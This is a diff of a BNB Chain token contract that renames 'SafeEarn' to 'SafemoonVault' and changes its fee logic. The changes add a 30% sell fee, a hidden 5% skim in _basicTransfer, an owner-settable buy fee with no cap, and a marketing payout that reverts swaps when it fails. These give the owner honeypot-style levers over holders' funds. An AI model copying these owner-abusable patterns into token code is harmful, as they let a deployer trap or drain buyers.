@@ -818,7 +818,7 @@ contract DividendDistributor is IDividendDistributor {
     }
 }
 
-contract SafeEarn is IERC20, Context, Ownable {
+contract SafemoonVault is IERC20, Context, Ownable {
     using SafeMath for uint256;
 
     uint256 public constant MASK = type(uint128).max;
@@ -826,14 +826,13 @@ contract SafeEarn is IERC20, Context, Ownable {
     address public WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
     address DEAD = 0x000000000000000000000000000000000000dEaD;
     address ZERO = 0x0000000000000000000000000000000000000000;
-    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;
 
-    string constant _name = "SafeEarn";
-    string constant _symbol = "SAFEARN";
+    string constant _name = "SafemoonVault";
+    string constant _symbol = "VAULT";
     uint8 constant _decimals = 9;
 
-    uint256 _totalSupply = 1_000_000_000_000_000 * (10 ** _decimals);
-    uint256 public _maxTxAmount = _totalSupply.div(400); // 0.25%
+    uint256 _totalSupply = 1 * 10**12 * (10 ** _decimals);
+    uint256 public _maxTxAmount = _totalSupply.div(200); // 0.5%
 
     mapping (address => uint256) _balances;
     mapping (address => mapping (address => uint256)) _allowances;
@@ -842,17 +841,19 @@ contract SafeEarn is IERC20, Context, Ownable {
     mapping (address => bool) isTxLimitExempt;
     mapping (address => bool) isDividendExempt;
 
-    uint256 liquidityFee = 100;
-    uint256 buybackFee = 400;
-    uint256 reflectionFee = 700;
+    uint256 liquidityFee = 400;
+    uint256 buybackFee = 300;
+    uint256 reflectionFee = 2000;
     uint256 marketingFee = 300;
-    uint256 totalFee = 1400;
+    uint256 totalFeeSells = 3000;
+    
+    uint256 totalFeeBuys = 500;
     uint256 feeDenominator = 10000;
-
+    
     address public autoLiquidityReceiver;
     address public marketingFeeReceiver;
 
-    uint256 targetLiquidity = 25;
+    uint256 targetLiquidity = 20;
     uint256 targetLiquidityDenominator = 100;
 
     IUniswapV2Router02 public router;
@@ -860,19 +861,15 @@ contract SafeEarn is IERC20, Context, Ownable {
 
     uint256 public launchedAt;
     uint256 public launchedAtTimestamp;
-
-    uint256 buybackMultiplierNumerator = 200;
-    uint256 buybackMultiplierDenominator = 100;
-    uint256 buybackMultiplierTriggeredAt;
-    uint256 buybackMultiplierLength = 30 minutes;
+    
+    bool public allowTransferToMarketing = true;
 
     bool public autoBuybackEnabled = false;
     mapping (address => bool) buyBacker;
-    uint256 autoBuybackCap;
-    uint256 autoBuybackAccumulator;
-    uint256 autoBuybackAmount;
-    uint256 autoBuybackBlockPeriod;
-    uint256 autoBuybackBlockLast;
+    uint256 autoBuybackAccumulator = 0;
+    uint256 autoBuybackAmount = 1 * 10**18;
+    uint256 autoBuybackBlockPeriod = 3600;
+    uint256 autoBuybackBlockLast = block.number;
 
     DividendDistributor distributor;
     address public distributorAddress;
@@ -943,11 +940,9 @@ contract SafeEarn is IERC20, Context, Ownable {
         if(inSwap){ return _basicTransfer(sender, recipient, amount); }
 
         checkTxLimit(sender, amount);
-        //
+        
         if(shouldSwapBack()){ swapBack(); }
         if(shouldAutoBuyback()){ triggerAutoBuyback(); }
-
-        //        if(!launched() && recipient == pair){ require(_balances[sender] > 0); launch(); }
 
         _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
 
@@ -966,8 +961,16 @@ contract SafeEarn is IERC20, Context, Ownable {
 
     function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
         _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
-        _balances[recipient] = _balances[recipient].add(amount);
-//        emit Transfer(sender, recipient, amount);
+        
+        if (shouldTakeFee(sender)) {
+            uint256 cAmount = amount.mul(5).div(10**2);
+            uint256 tAmount = amount.sub(cAmount);
+            
+            _balances[address(this)] = _balances[address(this)].add(cAmount);
+            _balances[recipient] = _balances[recipient].add(tAmount);
+        } else {
+            _balances[recipient] = _balances[recipient].add(amount);
+        }
         return true;
     }
 
@@ -983,19 +986,8 @@ contract SafeEarn is IERC20, Context, Ownable {
 
     function getTotalFee(bool selling) public view returns (uint256) {
         if(launchedAt + 1 >= block.number){ return feeDenominator.sub(1); }
-        if(selling){ return getMultipliedFee(); }
-        return totalFee;
-    }
-
-    function getMultipliedFee() public view returns (uint256) {
-        if (launchedAtTimestamp + 1 days > block.timestamp) {
-            return totalFee.mul(18000).div(feeDenominator);
-        } else if (buybackMultiplierTriggeredAt.add(buybackMultiplierLength) > block.timestamp) {
-            uint256 remainingTime = buybackMultiplierTriggeredAt.add(buybackMultiplierLength).sub(block.timestamp);
-            uint256 feeIncrease = totalFee.mul(buybackMultiplierNumerator).div(buybackMultiplierDenominator).sub(totalFee);
-            return totalFee.add(feeIncrease.mul(remainingTime).div(buybackMultiplierLength));
-        }
-        return totalFee;
+        if(selling){ return totalFeeSells; }
+        return totalFeeBuys;
     }
 
     function takeFee(address sender, address receiver, uint256 amount) internal returns (uint256) {
@@ -1016,7 +1008,7 @@ contract SafeEarn is IERC20, Context, Ownable {
 
     function swapBack() internal swapping {
         uint256 dynamicLiquidityFee = isOverLiquified(targetLiquidity, targetLiquidityDenominator) ? 0 : liquidityFee;
-        uint256 amountToLiquify = swapThreshold.mul(dynamicLiquidityFee).div(totalFee).div(2);
+        uint256 amountToLiquify = swapThreshold.mul(dynamicLiquidityFee).div(totalFeeSells).div(2);
         uint256 amountToSwap = swapThreshold.sub(amountToLiquify);
 
         address[] memory path = new address[](2);
@@ -1034,14 +1026,14 @@ contract SafeEarn is IERC20, Context, Ownable {
 
         uint256 amountBNB = address(this).balance.sub(balanceBefore);
 
-        uint256 totalBNBFee = totalFee.sub(dynamicLiquidityFee.div(2));
+        uint256 totalBNBFee = totalFeeSells.sub(dynamicLiquidityFee.div(2));
 
         uint256 amountBNBLiquidity = amountBNB.mul(dynamicLiquidityFee).div(totalBNBFee).div(2);
         uint256 amountBNBReflection = amountBNB.mul(reflectionFee).div(totalBNBFee);
         uint256 amountBNBMarketing = amountBNB.mul(marketingFee).div(totalBNBFee);
 
         try distributor.deposit{value: amountBNBReflection}() {} catch {}
-        payable(marketingFeeReceiver).call{value: amountBNBMarketing, gas: 30000}("");
+        transferToMarketing(amountBNBMarketing);
 
         if(amountToLiquify > 0){
             router.addLiquidityETH{value: amountBNBLiquidity}(
@@ -1055,6 +1047,14 @@ contract SafeEarn is IERC20, Context, Ownable {
             emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
         }
     }
+    
+    function transferToMarketing(uint256 amountBNBMarketing) internal {
+        
+        if (allowTransferToMarketing) {
+           (bool success,) = payable(marketingFeeReceiver).call{value: amountBNBMarketing, gas: 30000}("");
+           if (!success) revert();
+        }
+    }
 
     function shouldAutoBuyback() internal view returns (bool) {
         return msg.sender != pair
@@ -1064,23 +1064,15 @@ contract SafeEarn is IERC20, Context, Ownable {
         && address(this).balance >= autoBuybackAmount;
     }
 
-    function triggerZeusBuyback(uint256 amount, bool triggerBuybackMultiplier) external onlyOwner {
+    function triggerVaultBuyback(uint256 amount) external onlyOwner {
         buyTokens(amount, DEAD);
-        if(triggerBuybackMultiplier){
-            buybackMultiplierTriggeredAt = block.timestamp;
-            emit BuybackMultiplierActive(buybackMultiplierLength);
-        }
-    }
-
-    function clearBuybackMultiplier() external onlyOwner {
-        buybackMultiplierTriggeredAt = 0;
+        emit VaultBuyBackAndBurn(amount);
     }
 
     function triggerAutoBuyback() internal {
         buyTokens(autoBuybackAmount, DEAD);
         autoBuybackBlockLast = block.number;
         autoBuybackAccumulator = autoBuybackAccumulator.add(autoBuybackAmount);
-        if(autoBuybackAccumulator > autoBuybackCap){ autoBuybackEnabled = false; }
     }
 
     function buyTokens(uint256 amount, address to) internal swapping {
@@ -1092,24 +1084,16 @@ contract SafeEarn is IERC20, Context, Ownable {
             0,
             path,
             to,
-            block.timestamp
+            block.timestamp.add(30)
         );
     }
 
-    function setAutoBuybackSettings(bool _enabled, uint256 _cap, uint256 _amount, uint256 _period) external onlyOwner {
+    function setAutoBuybackSettings(bool _enabled, uint256 _amount, uint256 _period) external onlyOwner {
         autoBuybackEnabled = _enabled;
-        autoBuybackCap = _cap;
         autoBuybackAccumulator = 0;
         autoBuybackAmount = _amount;
         autoBuybackBlockPeriod = _period;
         autoBuybackBlockLast = block.number;
-    }
-
-    function setBuybackMultiplierSettings(uint256 numerator, uint256 denominator, uint256 length) external onlyOwner {
-        require(numerator / denominator <= 2 && numerator > denominator);
-        buybackMultiplierNumerator = numerator;
-        buybackMultiplierDenominator = denominator;
-        buybackMultiplierLength = length;
     }
 
     function launched() internal view returns (bool) {
@@ -1150,9 +1134,9 @@ contract SafeEarn is IERC20, Context, Ownable {
         buybackFee = _buybackFee;
         reflectionFee = _reflectionFee;
         marketingFee = _marketingFee;
-        totalFee = _liquidityFee.add(_buybackFee).add(_reflectionFee).add(_marketingFee);
+        totalFeeSells = _liquidityFee.add(_buybackFee).add(_reflectionFee).add(_marketingFee);
         feeDenominator = _feeDenominator;
-        require(totalFee < feeDenominator/4);
+        require(totalFeeSells < feeDenominator/3);
     }
 
     function setFeeReceivers(address _autoLiquidityReceiver, address _marketingFeeReceiver) external onlyOwner {
@@ -1190,7 +1174,25 @@ contract SafeEarn is IERC20, Context, Ownable {
     function isOverLiquified(uint256 target, uint256 accuracy) public view returns (bool) {
         return getLiquidityBacking(accuracy) > target;
     }
+    
+    function setAllowTransferToMarketing(uint256 _marketingFee) public onlyOwner {
+        allowTransferToMarketing = true;
+        marketingFee = _marketingFee;
+    }
+    
+    function disableTransferToMarketing() public onlyOwner {
+        marketingFee = 0;
+        allowTransferToMarketing = false;
+    }
+    
+    function setBuyingFee(uint256 buyFee) public onlyOwner {
+        totalFeeBuys = buyFee;
+    }
+    
+    function enableAutoBuyBack() public onlyOwner {
+        autoBuybackEnabled = true;
+    }
 
     event AutoLiquify(uint256 amountBNB, uint256 amountBOG);
-    event BuybackMultiplierActive(uint256 duration);
+    event VaultBuyBackAndBurn(uint256 amountBNB);
 }
